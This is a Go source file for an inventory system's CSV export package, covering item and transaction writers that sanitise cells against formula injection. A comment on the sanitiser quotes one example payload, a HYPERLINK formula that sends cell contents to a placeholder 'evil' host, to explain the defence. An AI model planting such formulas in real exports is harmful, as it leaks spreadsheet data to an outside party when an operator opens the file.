// Package exports holds pure CSV writers for the items and transactions
// collections. Both the kiosk and the controller binary use the same writers
// from inside their respective HTTP handlers — the handlers add auth + query
// parsing + response headers, the writers do the actual streaming.
//
// Keeping these pure (no *core.RequestEvent, no http.ResponseWriter) makes
// them trivially callable from tests and from a future scheduled-export
// path that doesn't go through HTTP at all.
package exports

import (
	"encoding/csv"
	"fmt"
	"io"
	"strconv"
	"time"

	"github.com/pocketbase/dbx"
	"github.com/pocketbase/pocketbase/core"
)

// csvSafe neutralizes CSV / spreadsheet formula injection. Excel, Google
// Sheets, and LibreOffice treat a cell whose first character is = + - @ (or a
// leading tab / CR that some parsers strip to reveal the next char) as a
// formula. Catalog text (item/user names, notes, categories, reasons) round-
// trips from the *untrusted* CSV importer into these admin-facing exports — in
// managed mode it's even pushed fleet-wide — so a crafted value like
// `=HYPERLINK("http://evil/?"&A1,"x")` would execute when an operator opens
// the file. Prefixing with a single quote forces the cell to plain text.
//
// A leading '-' is exempted when the whole value is a number so negative
// quantities/deltas aren't mangled — those columns aren't an injection vector.
func csvSafe(s string) string {
	if s == "" {
		return s
	}
	switch s[0] {
	case '=', '+', '@', '\t', '\r':
		return "'" + s
	case '-':
		if _, err := strconv.ParseFloat(s, 64); err != nil {
			return "'" + s
		}
	}
	return s
}

// writeRow sanitizes every field with csvSafe, then writes the row. Used for
// data rows; constant header rows go through cw.Write directly.
func writeRow(cw *csv.Writer, fields []string) error {
	for i, f := range fields {
		fields[i] = csvSafe(f)
	}
	return cw.Write(fields)
}

// TransactionsOptions narrows the transactions export. Zero values mean
// "no filter on that bound." From/To filter on `completed_at` (inclusive).
// IncludeSourceKiosk adds a `source_kiosk_code` column populated from the
// controller-only field; on a standalone kiosk these are always blank and
// the column would be noise, so the kiosk handler leaves it false.
type TransactionsOptions struct {
	From               string // RFC3339 — pre-validated by the caller
	To                 string
	IncludeSourceKiosk bool
}

// WriteItemsCSV streams the items collection as CSV in the same column
// shape the kiosk's /api/kiosk/items/import accepts, so an export can
// round-trip back through the importer.
func WriteItemsCSV(app core.App, w io.Writer) error {
	items, err := app.FindRecordsByFilter("items", "", "code", 0, 0)
	if err != nil {
		return fmt.Errorf("find items: %w", err)
	}

	cw := csv.NewWriter(w)
	defer cw.Flush()

	if err := cw.Write([]string{
		"code", "name", "type", "unit", "tracking_mode",
		"category", "active", "notes",
		"quantity_on_hand", "reorder_threshold",
	}); err != nil {
		return err
	}

	for _, it := range items {
		active := "false"
		if it.GetBool("active") {
			active = "true"
		}
		if err := writeRow(cw, []string{
			it.GetString("code"),
			it.GetString("name"),
			it.GetString("type"),
			it.GetString("unit"),
			it.GetString("tracking_mode"),
			it.GetString("category"),
			active,
			it.GetString("notes"),
			fmt.Sprintf("%d", it.GetInt("quantity_on_hand")),
			fmt.Sprintf("%d", it.GetInt("reorder_threshold")),
		}); err != nil {
			return err
		}
	}
	return nil
}

// WriteTransactionsCSV streams completed transactions as CSV. Line counts
// come from the denormalized transactions.lines_count, so this is a single
// SELECT regardless of fleet size.
//
// On the controller side, callers should set opts.IncludeSourceKiosk=true
// so downstream consumers can group/demultiplex by the originating kiosk.
// The kiosk's `kiosk_code` column carries the same info on standalone
// kiosks; the source field exists for cross-fleet aggregation only.
func WriteTransactionsCSV(app core.App, w io.Writer, opts TransactionsOptions) error {
	filter := `status = "completed"`
	params := dbx.Params{}
	if opts.From != "" {
		filter += " && completed_at >= {:from}"
		params["from"] = opts.From
	}
	if opts.To != "" {
		filter += " && completed_at <= {:to}"
		params["to"] = opts.To
	}

	txs, err := app.FindRecordsByFilter("transactions", filter, "-completed_at", 0, 0, params)
	if err != nil {
		return fmt.Errorf("find transactions: %w", err)
	}

	cw := csv.NewWriter(w)
	defer cw.Flush()

	header := []string{
		"transaction_id", "completed_at", "user_code", "user_name",
		"line_count", "kiosk_code", "location_code",
	}
	if opts.IncludeSourceKiosk {
		header = append(header, "source_kiosk_code")
	}
	// Appended last (after the optional source column) so positional parsers
	// see new fields only at the end. Empty for un-tagged transactions.
	header = append(header, "door_id")
	if err := cw.Write(header); err != nil {
		return err
	}

	// Tiny per-call cache: many transactions in a tight window share a few
	// users; one lookup per ID is plenty.
	userCache := map[string]*core.Record{}
	for _, t := range txs {
		userID := t.GetString("user")
		u, ok := userCache[userID]
		if !ok {
			u, _ = app.FindRecordById("users", userID)
			userCache[userID] = u
		}
		var userCode, userName string
		if u != nil {
			userCode = u.GetString("code")
			userName = u.GetString("name")
		}
		row := []string{
			t.Id,
			t.GetDateTime("completed_at").Time().Format(time.RFC3339),
			userCode, userName,
			fmt.Sprintf("%d", t.GetInt("lines_count")),
			t.GetString("kiosk_code"),
			t.GetString("location_code"),
		}
		if opts.IncludeSourceKiosk {
			row = append(row, t.GetString("source_kiosk_code"))
		}
		row = append(row, t.GetString("door_id"))
		if err := writeRow(cw, row); err != nil {
			return err
		}
	}
	return nil
}
